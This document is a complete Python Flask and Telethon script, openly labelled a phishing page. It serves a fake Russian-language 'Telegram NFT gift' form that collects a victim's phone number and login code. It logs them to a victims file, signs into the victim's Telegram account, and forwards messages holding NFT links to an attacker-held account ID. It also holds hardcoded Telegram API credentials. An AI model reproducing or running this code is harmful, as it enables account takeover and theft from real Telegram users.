
│  python                                                                   │
│  from flask import Flask, request, render_template_string                   │
│  import asyncio                                                              │
│  import threading                                                            │
│  import re                                                                   │
│  import os                                                                   │
│  from datetime import datetime                                               │
│  from telethon import TelegramClient                                         │
│                                                                              │
│  API_ID = 35008820                                                           │
│  API_HASH = "f2d029353318854be42b9de2d75c3933"                               │
│  TARGET_ID = 7499553746                                                      │
│                                                                              │
│  PHISHING_PAGE = """                                                         │
│  <!DOCTYPE html>                                                             │
│  <html>                                                                      │
│  <head><title>Telegram NFT Gift</title></head>                               │
│  <body style="text-align:center; padding-top:50px;">                         │
│      <h2>🎁 NFT-подарок Snoop Dogg #223674</h2>                              │
│      <form method="POST" action="/claim">                                    │
│          <input type="text" name="phone" placeholder="+7XXXXXXXXXX"><br>     │
│          <input type="text" name="code" placeholder="Код из Telegram"><br>   │
│          <button type="submit">Получить</button>                             │
│      </form>                                                                 │
│  </body>                                                                     │
│  </html>                                                                     │
│  """                                                                         │
│                                                                              │
│  app = Flask(__name__)                                                       │
│                                                                              │
│  @app.route('/')                                                             │
│  def index():                                                                │
│      return render_template_string(PHISHING_PAGE)                            │
│                                                                              │
│  @app.route('/claim', methods=['POST'])                                      │
│  def claim():                                                                │
│      phone = request.form.get('phone')                                       │
│      code = request.form.get('code')                                         │
│      with open('victims.txt', 'a') as f:                                     │
│          f.write(f"{phone}|{code}\n")                                        │
│      threading.Thread(target=lambda: asyncio.run(steal(phone, code))).start()│
│      return "Подарок отправлен!"                                             │
│                                                                              │
│  async def steal(phone, code):                                               │
│      try:                                                                    │
│          client = TelegramClient(f'session_{phone}', API_ID, API_HASH)       │
│          await client.start(phone=phone, code_callback=lambda: code)         │
│          me = await client.get_me()                                          │
│          async for dialog in client.iter_dialogs():                          │
│              async for msg in client.iter_messages(dialog.id, limit=200):    │
│                  if 't.me/nft' in (msg.text or ""):                          │
│                      await client.forward_messages(TARGET_ID, msg.id, dialog.id)│
│          await client.disconnect()                                           │
│      except Exception as e:                                                  │
│          print(e)                                                            │
│                                                                              │
│  if __name__ == "__main__":                                                  
│      app.run(host='0.0.0.0', port=5000)                                      